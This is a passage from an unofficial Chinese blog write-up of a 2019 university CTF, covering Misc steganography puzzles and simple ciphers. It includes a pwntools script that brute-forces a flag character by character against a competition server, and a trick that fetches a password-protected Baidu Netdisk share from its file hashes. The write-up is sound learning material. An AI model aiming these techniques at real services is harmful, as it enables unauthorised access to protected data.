题</strong>，还是门槛相对较高的<strong>逆向题</strong>的消息，再想到各种“聚沙成塔”“坚持不懈”“不劳无获”“龟兔赛跑”之类的鸡汤……</p> <p>由于竞争的存在，小透明参赛的动机开始<del>被一点点地扭曲</del>(｡í _ ì｡) 从一开始的**“过来玩一玩”<strong>变成了各种</strong>“不能被○○超过了”<strong>，到了最后目标变成了</strong>“尝试超过那位已从本校计科专业毕业的传说级菊苣”**，结果就是小透明在这一周用尽了几乎所有的精力来肝比赛，然后……</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/587199977778e21ce2588a5fdad21656/clnNdBks.png" data-src-webp="https://p.sda1.dev/12/e90ca4ee599219ef843249b453599eaf/fdjkj2KQ.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRqIAAABXRUJQVlA4IJYAAABwBACdASogABIAPrVIoUuwo5QYDAQAcAtEs4AO0dBNAfy4YqrruDZifhp2pAD+eT+nJCm1hbtCD93dM2/Q3/mv1Ev0LA+JPlz3pw+DHPwv2eS76uFyZvcSjhQeNZw/upbvG/a/OCN/iIhKO0nh7GJETn5z9UPkym5PKX9SdKMrWKtIHJUZojERcnHpzcHiCQfu84UAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/587199977778e21ce2588a5fdad21656/clnNdBks.png"> </noscript> </figure> <p>虽然得了第一位，但是大概是因为太累了，还有天气变化的关系，结果在比赛进行到后期的时候似乎是感冒了……果然还是不应该勉强自己，周末坐校车回家时头又疼又晕的感觉太难受了ﾍ(‘.’o)（虽然现在已经没那么不舒服啦）</p> <p>这是个<strong>非官方</strong>的 Write-Up，内容<strong>仅限于自己当时做出来的部分题目</strong>。官方版的 Write-Up 应该会在<a href="http://blog.leanote.com/xp0int" rel="noopener" target="_blank">主办方 Xp0int 的博客</a>上更新，不过小透明本来就有打算自己写一份放在这里，至少当成一个记录好了～٩(ˊᗜˋ*)و</p> <blockquote> <p><a href="http://blog.leanote.com/post/xp0int/2019%E6%9A%A8%E5%8D%97%E5%A4%A7%E5%AD%A6-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup" rel="noopener" target="_blank">官方 Write-Up</a> 已放出，相比这里的非官方 Write-Up 多出了以下题目的题解：</p> <ul> <li>Misc<ul> <li>orzzzxzz</li> </ul> </li> <li>Reverse<ul> <li>binary</li> </ul> </li> <li>Web<ul> <li>Image Checker</li> <li>unserialize</li> </ul> </li> <li>pwn<ul> <li>inversion</li> <li>syscall</li> </ul> </li> </ul> <p>↑都是当时不会做的题（笑）</p> <p>另外也公布了题目源码和附件：<a href="https://github.com/xf1les/2019JNUCTF" rel="noopener" target="_blank">xf1les&#x2F;2019JNUCTF</a></p> </blockquote> <p><em>题目实在太多了，可以点击左边的“目录”菜单，直接传送到某个题目的 Write-Up～</em></p> <hr> <h1 id="Misc"><a class="headerlink" href="#Misc" title="Misc"></a>Misc</h1><h2 id="O-N-E-O-F-U-S"><a class="headerlink" href="#O-N-E-O-F-U-S" title="O N E O F U S"></a>O N E O F U S</h2><p>不知道为什么，MPC-HC 直接打开视频本体就是 flag 了，<del>所以这题白给 2333</del></p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(85.4167%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/fe61419715ced478d61c18e855a4a089/uzx9ed4s.png" data-src-webp="https://p.sda1.dev/12/9ca39f04708cd7900cf52a9da9167938/Hrt4JkNZ.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRsIAAABXRUJQVlA4ILYAAADQBACdASogABsAPrVOnkqqsJKYDAQAcAtEtIAAR7pB6Ebnb98YTTATo2FwHtjQAAD++M6wzEmMiG6CZhYLSKCyZbA3+uUliTmJfGFcASayTYAm2nAgeJTLeZpHi6FHhbv8x+r8kRNnMEtEweI23zSBh2hnLPyW0ReEz6n7tywnoRcJ8nd919ew156WblvTVP3VFQwCoL5hQXIO5r2j0JQ48sTiA9615Zncl0LBhecM07tha9nAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/fe61419715ced478d61c18e855a4a089/uzx9ed4s.png"> </noscript> </figure> <p>正经的解法：这个 MKV 有两个视频流，flag 藏在某个视频流里面，使用 FFmpeg 就可以把这个流单独拆出来。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_0">ffmpeg</span><span class="__s_1"> -i</span><span class="__s_2"> oneofus.mkv</span><span class="__s_1"> -map</span><span class="__s_2"> 0:2</span><span class="__s_1"> -c</span><span class="__s_2"> copy</span><span class="__s_2"> oneofus.jpg</span></span></code></pre><code class="language">bash</code></figure> <h2 id="LoLo"><a class="headerlink" href="#LoLo" title="LoLo"></a>LoLo</h2><p>蓝色盲水印，出门右转：<a href="https://github.com/linyacool/blind-watermark/tree/python3" rel="noopener" target="_blank">GitHub linyacool&#x2F;blind-watermark</a></p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_0">decode.py</span><span class="__s_1"> --original</span><span class="__s_2"> lolo_1.png</span><span class="__s_1"> --image</span><span class="__s_2"> lolo_2.png</span><span class="__s_1"> --result</span><span class="__s_2"> lolo_3.png</span></span></code></pre><code class="language">bash</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(100%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/ad787dc2a13934763d71843ec34ec553/sT67Jy6A.png" data-src-webp="https://p.sda1.dev/12/c0bd6f0de023ceb7c68c76e95da62786/WpVSd8Cc.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRkgAAABXRUJQVlA4IDwAAADwAgCdASogACAAPrVKn0mDAIAOAWiWkAAHG82J5BwVAAD+9PzWISzlwdLViqjtOUsL11k+rR89vTNfAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/ad787dc2a13934763d71843ec34ec553/sT67Jy6A.png"> </noscript> </figure> <p>不过小透明忍不住想吐槽一下这题，因为……</p> <p><strong>完 全 一 致</strong></p> <p>实际上这题和去年“新生杯”的类似题用的是同一种盲水印。比赛前还想着“今年是不是又要出一个一模一样的”，没想到真的出了(´ﾟωﾟ｀)</p> <p>但是去年的<a href="http://blog.leanote.com/post/xp0int/%E6%9F%AF%E5%93%80" rel="noopener" target="_blank">官方 Write-Up</a> 里面都在自我吐槽“这题出的不是很好，有些盲水印脚本无法解出答案，暂时未去了解为什么”了啊！而且周围有不少小伙伴们试过好几种其它的盲水印工具，确实都解不出来，所以这题实际上是在考信息搜索能力……？(&#x3D;’_‘&#x3D;)</p> <h2 id="wewuwewu"><a class="headerlink" href="#wewuwewu" title="wewuwewu"></a>wewuwewu</h2><p>首先，这实际上是个 JPEG 图片。然后，翻二进制数据的话……</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(68.2143%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/771dcb340622c91a3d6946ec0e5ccabe/efoUm0H1.png" data-src-webp="https://p.sda1.dev/12/c28c201c667dd29514ac26650461afaf/h7ZQIcTQ.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRo4AAABXRUJQVlA4IIIAAAAQBACdASogABYAPrVOpEukkcoCqjgFolpAAAuacTIPzweePYTkIKeFYAD+84n4NqiO8jV+yNRq9xMuo753wY+3S5wQOlMKk5ETP7UM62jfxTSYWV3xcm956NbBHO8GvLNk3gCznVCK4KcXJlpo8SVYmX/vOkh6doyqfs5ihzu4AAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/771dcb340622c91a3d6946ec0e5ccabe/efoUm0H1.png"> </noscript> </figure> <h2 id="rainbow"><a class="headerlink" href="#rainbow" title="rainbow"></a>rainbow</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(14.0541%,130px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/2d4dc24427d7747a6a924156fcaef625/Uq9A9HOk.png" data-src-webp="https://p.sda1.dev/12/59a14102d254207ab497fb32c4d714eb/Xh1tkk1U.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRoAAAABXRUJQVlA4IHQAAABwAwCdASogAAQAPrVOoUmENgEAHALRLKAYUA1qCQMKDgOucQAA/v6EaftdUekVxN3RRp/+oH+t6R/7xEs7alOerMKB1St6ZuuPP584OKQZd04n2xl7gedab6La5ClPBHCFYfuiP7kfT4gHp9vDrNkGLhAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/2d4dc24427d7747a6a924156fcaef625/Uq9A9HOk.png"> </noscript> </figure> <p>左起，每个色块的颜色和对应的字符：</p> <ul> <li>0x000031 1</li> <li>0x300000 0</li> <li>0x003100 1</li> <li>0x000031 1</li> <li>0x630000 c</li> <li>0x006800 h</li> <li>0x000041 A</li> <li>0x730000 s</li> <li>0x000033 3</li> <li>0x5f0000 _</li> <li>0x003100 1</li> <li>0x480000 H</li> <li>0x006500 e</li> <li>0x5f0000 _</li> <li>0x007200 r</li> <li>0x000061 a</li> <li>0x004900 I</li> <li>0x6e0000 n</li> <li>0x000062 b</li> <li>0x003000 0</li> <li>0x000077 w</li> <li>0x002100 !</li> <li>0x000021 !</li> <li>0x003100 1</li> <li>0x000032 2</li> <li>0x003200 2</li> <li>0x000037 7</li> </ul> <p>加上 flag 的头和尾，得到的就是 <code>flag&#123;1011chAs3_1He_raInb0w!!1227&#125;</code>。</p> <h2 id="NoMansLand"><a class="headerlink" href="#NoMansLand" title="NoMansLand"></a>NoMansLand</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/618b3266c7c4df3d7fee086d0116500e/HbAjA8cx.png" data-src-webp="https://p.sda1.dev/12/d18675feb197ea4bf6e65d207494ef65/NsuwM47E.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRlgAAABXRUJQVlA4IEwAAACwAwCdASogABIAPrVInUm0iewCADgFolpAABb6xdXgG+xy1tG0gAD8j/664be1iGrvOulPQuArXnxfEzAAQZt3ssMW62+RGPQL4AAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/618b3266c7c4df3d7fee086d0116500e/HbAjA8cx.png"> </noscript> </figure> <p><del>改一个字就加一个 Commit，这样我的 GitHub 主页上的日历也可以是绿油油的一片啦！</del></p> <h2 id="Music"><a class="headerlink" href="#Music" title="Music"></a>Music</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(37.7691%,386px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/44b995ee0310c7107738b33af36baa19/MZZ4gpri.png" data-src-webp="https://p.sda1.dev/12/823996e2874d9117270edf85f2c95e67/4rvPU4kg.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmYAAABXRUJQVlA4IFoAAABwAwCdASogAAwAPrVInkmqiewCADgFollAL5IIelFX4YDzJ4AA/vcsF78VYgApG12WPUpk+mCbW5mFjL2Z4bD6Lw/gMh+whnmu8VIbQwBJlQPfh5gSFHTgAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/44b995ee0310c7107738b33af36baa19/MZZ4gpri.png"> </noscript> </figure> <p>音符加密（<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" rel="noopener" target="_blank">这里</a>是工具），这道题和“与佛论禅”、核心价值观是一个性质……</p> <h2 id="carefully"><a class="headerlink" href="#carefully" title="carefully"></a>carefully</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(53.5565%,384px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/77d0f8e1a33f7d58a53975b7dad95361/K6l31qE8.png" data-src-webp="https://p.sda1.dev/12/f5c8c8665d8d3bfafac7de2fb4d38bce/J6yvjOnz.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRpIAAABXRUJQVlA4IIYAAACQBACdASogABEAPrVOnksmksoDVDgFollAFQb5mAHh2+EHpGhkJ7OVOGsFVKgA/ug8nKQ1+OeM2xuu+pfV41ZjRd4JXpkEZRoQCjiUSDvKNwsam/U+ftf8wEeUn9cqyldGv6yxjGB8oahbAQDx2tbrpumY5algqXdKJpd+szfvBVxoeAAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/77d0f8e1a33f7d58a53975b7dad95361/K6l31qE8.png"> </noscript> </figure> <p>核心价值观解密（<a href="https://z.duoluosb.com/" rel="noopener" target="_blank">这里</a>是工具），得到 <code>g1v_vmxibk1rlm_1h_u4mmb_4m1_45yv11vezyov</code>，试了各种单表替换密码后发现是密码是反方向字母表，又称 Atbash（<a href="https://tool.bugku.com/jiemi/" rel="noopener" target="_blank">这里</a>是工具），数字和下划线不参与编码（看上去确实是这么回事），最后得到 <code>flag&#123;t1e_encryp1ion_1s_f4nny_4n1_45be11evable&#125;</code>。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(57.781%,401px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/c633da4b30caeaa4202349db25332a1a/tshGyOyW.png" data-src-webp="https://p.sda1.dev/12/5eaed5157bc75409f0f21029e2ffe162/yctKr5Hw.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRoAAAABXRUJQVlA4IHQAAACQAwCdASogABIAPrVKoEumqZEYDAQAcAtEtI4WAAICxpf5oD2gAP7xzWvhHX8qNOs0Be/3b0sHGPR/vKNRAvh1ormfahQLZFyqO4tbwOFPcr0Q7mXAQwCkdstqQUPo7VH4vv63OZiveQ2dBI03q8pnNgAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/c633da4b30caeaa4202349db25332a1a/tshGyOyW.png"> </noscript> </figure> <h2 id="Guess"><a class="headerlink" href="#Guess" title="Guess"></a>Guess</h2><p>个人觉得是 Misc 里最有技术含量的一题，大概是因为需要用到脚本？</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(70.38%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/67e6a099926f448df3b62f6311444b83/8iy9upRQ.png" data-src-webp="https://p.sda1.dev/12/661e3e37cac5583628e8b0dd4ca01212/0YWItnKJ.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRhgBAABXRUJQVlA4IAwBAADwBQCdASogABcAPrVMnkoiiuwCADgFolmALEegySx0Es17yGBZTdndwVYj2eBxybIQd8B5NE6cAAD+84H9AMTjZHWEE9xS1WWcKQ3Bslo/D0MphPodIViflpkT6QHuzt2Ut9kKYZ7Yr9vEmJsNxkYNc5dL9mr8oVX8oMwYi4hVxZUWEb3sPeagZsGgEcdzfQAHtdndmUXcDHKPTRekIp4brWi6BPM0/mp6mlr6YVt/LZVIGa6/0V46bbF5c5R0n1oTeqP/5uBNf61/uler3BO+AbAfVH/H797/j9ahgLzWiy5UZE6hw3jtoe0wuFUsC2ECQn3Qwmetbj5hxHfX7gPSQTfZFztDBXZIEWAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/67e6a099926f448df3b62f6311444b83/8iy9upRQ.png"> </noscript> </figure> <p>用 pwntools 连上服务器，这个藏着的东西大概就是 flag 了，如果输错了会返回 <code>Oops!</code>，全部输对了应该会有提示，那如果部分输对了话……</p> <p>是<strong>没有任何输出</strong>的哦？|･ω･｀)</p> <p>根据惯例，flag 应该由大小写字母和数字和各种符号组成，开头必然是 <code>flag&#123;</code>，剩下的就需要一个个慢慢<strong>爆破</strong>了。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_4">#!/usr/bin/env python</span></span>
<span class="line"></span>
<span class="line"><span class="__s_5">from</span><span class="__s_6"> pwn </span><span class="__s_5">import</span><span class="__s_6"> *</span></span>
<span class="line"></span>
<span class="line"><span class="__s_4"># 已知的前几个字</span></span>
<span class="line"><span class="__s_6">flag = </span><span class="__s_2">'flag{'</span></span>
<span class="line"><span class="__s_4"># 为了加快爆破速度，按照字符在 flag 中的出现概率降序排列字符集（滑稽）</span></span>
<span class="line"><span class="__s_6">charset = </span><span class="__s_2">'abcdefghijklmnopqrstuvwxyz0123456789-_ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span class="__s_1">{}</span><span class="__s_2">!'</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">p = remote(</span><span class="__s_2">'35.194.143.125'</span><span class="__s_6">, </span><span class="__s_7">30001</span><span class="__s_6">)</span></span>
<span class="line"></span>
<span class="line"><span class="__s_4"># 爆破的原理是从字符集中逐个尝试将字符追加到已知的 flag 后面</span></span>
<span class="line"><span class="__s_4"># 如果错误，下一行就是 Oops!</span></span>
<span class="line"><span class="__s_4"># 如果正确，下一行就是 I wanna give you sth</span></span>
<span class="line"><span class="__s_4"># 如果追加的字符是 }，就结束爆破输出 flag</span></span>
<span class="line"><span class="__s_6">akarin_have_girlfriend = </span><span class="__s_1">False</span></span>
<span class="line"><span class="__s_5">while</span><span class="__s_8"> not</span><span class="__s_6"> akarin_have_girlfriend:</span></span>
<span class="line"><span class="__s_6">    end = </span><span class="__s_1">False</span></span>
<span class="line"><span class="__s_5">    for</span><span class="__s_6"> char </span><span class="__s_5">in</span><span class="__s_6"> charset:</span></span>
<span class="line"><span class="__s_6">        p.recv()</span></span>
<span class="line"><span class="__s_6">        p.sendline(</span><span class="__s_2">'4'</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">        p.recv()</span></span>
<span class="line"><span class="__s_6">        p.sendline(flag + char)</span></span>
<span class="line"><span class="__s_6">        result = p.recvline()</span></span>
<span class="line"><span class="__s_9">        print</span><span class="__s_6">(</span><span class="__s_2">'Trying: '</span><span class="__s_6"> + char)</span></span>
<span class="line"><span class="__s_5">        if</span><span class="__s_6"> result == </span><span class="__s_2">'Oops!</span><span class="__s_a">\n</span><span class="__s_2">'</span><span class="__s_6">:</span></span>
<span class="line"><span class="__s_9">            print</span><span class="__s_6">(</span><span class="__s_2">'Fail.'</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_5">        elif</span><span class="__s_6"> result == </span><span class="__s_2">'I wanna give you sth</span><span class="__s_a">\n</span><span class="__s_2">'</span><span class="__s_6">:</span></span>
<span class="line"><span class="__s_6">            flag += char</span></span>
<span class="line"><span class="__s_9">            print</span><span class="__s_6">(</span><span class="__s_2">'Found! Now Akarin get: '</span><span class="__s_6"> + flag)</span></span>
<span class="line"><span class="__s_5">            if</span><span class="__s_6"> char == </span><span class="__s_2">'}'</span><span class="__s_6">:</span></span>
<span class="line"><span class="__s_6">                end = </span><span class="__s_1">True</span></span>
<span class="line"><span class="__s_5">            break</span></span>
<span class="line"><span class="__s_5">    if</span><span class="__s_6"> end:</span></span>
<span class="line"><span class="__s_9">        print</span><span class="__s_6">(</span><span class="__s_2">'The flag is: '</span><span class="__s_6"> + flag)</span></span>
<span class="line"><span class="__s_5">        break</span></span></code></pre><code class="language">python</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/8b78d3869db435070a22a8273a0c3699/Gmyos9n6.png" data-src-webp="https://p.sda1.dev/12/4edafbf820323902a9adc20a378cc27f/dzehz6OW.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRhYBAABXRUJQVlA4IAoBAADwBgCdASogABIAPrVSn0qytJKYDAQAcAtEtgBYj0HlI8A5fYrHsBz/9k6AmhDGn7/HW0WZnDWNWjTSigBVxkwAAP7ykCzNNGxsqqV/4vKG5OqpLzcsePT/kCUVUx2mKAjheZCzdv2zmVIbOI6ioynaLnWRbg+fZoCnFWzcjrm3ZR+gazafTIiXr47Blk6yAfmEeEZo09nRCrLmE2Rp0d8JnZfnU1FpymLtELCCLgfEWQrwl+LiPYDAGMTTnhCElMzbxYaA+CwA2II4iFBG5MCyxG8T59pwyIC20SAATIrpuL/o+zTKZYEXfkyLY7mseuYmCYMlOcdDUMwXsz36ednFP+CGvllz1bwAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/8b78d3869db435070a22a8273a0c3699/Gmyos9n6.png"> </noscript> </figure> <p><code>flag&#123;Pyth0n_1s_s0_mmmmmm4g1111calll!!!&#125;</code>，不过爆破成功了却连个提示语都没有，不应该啊ﾍ(‘.’o)</p> <p><del>由此可见，Python 是世界上最好的语言！</del>（PHP 党激怒）</p> <h2 id="nopan"><a class="headerlink" href="#nopan" title="nopan"></a>nopan</h2><blockquote> <p>“知道百度网盘怎样上传文件吗？”——官方提示</p> </blockquote> <p>没有尝试过各种手段和在<del>即将进入全面小康社会的</del> 9102 年仍然坚持通过限速让用户<strong>梦回二十年前用拨号上网的速度下载文件</strong>的万恶的百度网盘做过斗争的人，大概是做不出这题的|-&#96; )</p> <blockquote> <p>好久不见。上次你提到的那个文件，我已经把它上传到■■网盘里了。网盘链接和提取码如下：</p> <p>链接：<a href="https://pan.baidu.com/s/1ehuW4C6s16Wm4U91f7kKCw" rel="noopener" target="_blank">https://pan.■■■■■.com/s/1ehuW4C6s16Wm4U91f7kKCw</a><br>提取码：■■■■</p> <p>最近我很忙，可能要很久才能回复。注意别把链接和提取码搞丢了。</p> </blockquote> <p><del>但是你真的就弄丢了⊂彡☆))д&#96;)</del></p> <blockquote> <p>最近网盘的下载速度越来越慢了。我担心你文件没有下载完，网络就断开了。以防万一，请校检下载的文件是否符合以下哈希值：</p> <p>文件名：■■■■■■■■<br>文件大小: 2865514（2.8MB）<br>MD5 : 3571407E1F0D73B789F2232448680CD1<br>SHA-1: 0561C239AA1F29A68269FC8A03E442E691CBF6FA<br>CRC32: 0E250626</p> </blockquote> <p><del>你也知道辣鸡百度网盘限速啊？</del></p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(68.7751%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/8bd50acd2ca1520b26a236a7045a08e1/GsOybDFL.png" data-src-webp="https://p.sda1.dev/12/ea3d05af8db9652c7f5a28195106b020/rrFiQr2t.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRrYAAABXRUJQVlA4IKoAAAAQBQCdASogABYAPq1InEmkkVHYBgBgCsSxgFcW//U0QTu3dqY30j//6f2uPkMo7DQAAP72QvUIFlOqoLjQXEi40pFd6+mOsHECTPvOftEpDQ/GzydmatoYUx3qAAABX3ZqzAxcoraC8cujhY340i80AqEVE9Nyox39yhB2JY+34Z4Hq9hJcxFslwr8sPn96oAelamjQTvjCfE69ugxhmHybptrD6oHwtoAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/8bd50acd2ca1520b26a236a7045a08e1/GsOybDFL.png"> </noscript> </figure> <p>各种“万能钥匙”并没有什么效果，强行爆破那个分享链接的密码更是不可能的事情。</p> <p>实际上，分享链接不重要，这几个 Hash 才是重点。题目的附件还有上面这张图片，用 Photoshop 打开会提示“遇到意外的文件尾”等等，显然是图片的数据被强行截断了。当然，分享的文件名应该就是 <code>flag.png</code>。</p> <p>有个命令行版百度网盘客户端 <a href="https://github.com/iikira/BaiduPCS-Go" rel="noopener" target="_blank">BaiduPCS-Go</a> 自带了“手动秒传”的功能。百度网盘秒传的原理是判断文件的长度、完整文件和文件的前 256KB 的 MD5、CRC32。现在这些值都有了，就可以把文件<strong>直接秒传</strong>到自己的网盘上。</p> <p>“文件的前 256KB 的 MD5”可以通过现在手上的这半截图片再截取前 256KB，然后用各种工具算出来：<code>875B6EB10090EB3127D206F35A4B277E</code></p> <p>然后使用 BaiduPCS-Go 输入命令：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_0">ru</span><span class="__s_1"> -length=2865514</span><span class="__s_1"> -md5=3571407E1F0D73B789F2232448680CD1</span><span class="__s_1"> -crc32=0E250626</span><span class="__s_1"> -slicemd5=875B6EB10090EB3127D206F35A4B277E</span><span class="__s_2"> /flag.png</span></span>
<span class="line"><span class="__s_0">d</span><span class="__s_2"> /flag.png</span><span class="__s_1"> --nocheck</span></span></code></pre><code class="language">bash</code></figure> <p>就可以下载到原图然后直接看到 <code>flag&#123;2995_ke3p_clam_and_enj0y_y0ur_fl1ght_300&#125;</code>，还好不需要继续折腾隐写什么的……</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(72.5389%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/382e42abf50273d12f1a344cbe9ad22c/z6JYCawu.jpg" data-src-webp="https://p.sda1.dev/12/053d1fcbfe54b7d874a19063d40efff1/wNqP6PCC.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRjYBAABXRUJQVlA4ICoBAACwBQCdASogABcAPrVKnUmkiOwCADgFolAE6Qf5Uge7dF/vPmwayLgGlOnvR9BlH99jps9ceggA/rFliGMOQMOTIuEprgnbzwhvoE5n8ZUuVicQZjnixkNaJpFNdaR1eY51kAaN5oWaOOOvJ7EJP0NbTBqEuAAaJEKFRYhKeeyJrvyK58IfU9QGbtYiykusijGTx9IGTyQN2HYdvRCQk83Orix2f9cjvbaUq9HgDZVoCmenYRTLe36952c/agGbbxE6/dUsMQmgwLRbBinY3hCZx9JtnqCba8ljrLjgMun7G8FMSgo8MmRJMWaIplgSsHpiZzphsM4sDiurc21T3hGXD2TqEb07o7PSazS36ARZaxqedKqFJ3IAt+4qgDQ1+ugTayMNlO2gMUAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/382e42abf50273d12f1a344cbe9ad22c/z6JYCawu.jpg"> </noscript> </figure> <p>（上面这张不是原图，上传到图床前小透明自己把图片压缩了）</p> <h1 id="Crypto"><a class="headerlink" href="#Crypto" title="Crypto"></a>Crypto</h1><h2 id="really-encrypted"><a class="headerlink" href="#really-encrypted" title="really_encrypted"></a>really_encrypted</h2><p><del>不言而喻，一目了然，真・签到题</del></p> <p>栅栏密码（<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" rel="noopener" target="_blank">这里</a>是工具），<code>flag&#123;Ai8sh5wbxj0whksjshdyw3&#125;</code>。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(66.5131%,433px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/932fa47f7ed932abc661f4ec13f88331/iDoLQcG6.png" data-src-webp="https://p.sda1.dev/12/3f3eb6352d36e6aa6e90bd82eb9eee47/uxbhhsq7.webp"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRlgAAABXRUJQVlA4IEwAAACQAwCdASogABUAPrVMoEsotQwGAgA4BaJaQAALnXP2TMRBY+YAAP74r7mJUx4ZzknCzw2wnCnsan0S9vR1rFQde5ikCOiidCxAAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/932fa47f7ed932abc661f4ec13f88331/iDoLQcG6.png"> </noscript> </figure> <h2 id="easyrsa"><a class="headerlink" href="#easyrsa" title="easyrsa"></a>easyrsa</h2><p>RSA 解密需要求模除法逆元，从 <a href="https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python/29762148#29762148" rel="noopener" target="_blank">Stack Overflow</a> 上找到了一个非常实用的匿名函数可以直接实现逆元的计算：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_6">MMI = </span><span class="__s_8">lambda</span><span class="__s_b"> A</span><span class="__s_6">, </span><span class="__s_b">n</span><span class="__s_6">,</span><span class="__s_b">s</span><span class="__s_6">=</span><span class="__s_7">1</span><span class="__s_6">,</span><span class="__s_b">t</span><span class="__s_6">=</span><span class="__s_7">0</span><span class="__s_6">,</span><span class="__s_b">N</span><span class="__s_6">=</span><span class="__s_7">0</span><span class="__s_6">: (n &#x3C; </span><span class="__s_7">2</span><span class="__s_8"> and</span><span class="__s_6"> t%N </span><span class="__s_8">or</span><span class="__s_6"> MMI(n, A%n, t, s-A//n*t, N </span><span class="__s_5">or</span><span class="__s_6"> n),-</span><span class="__s_7">1</span><span class="__s_6">)[n&#x3C;</span><span class="__s_7">1</span><span class="__s_6">]</span></span>
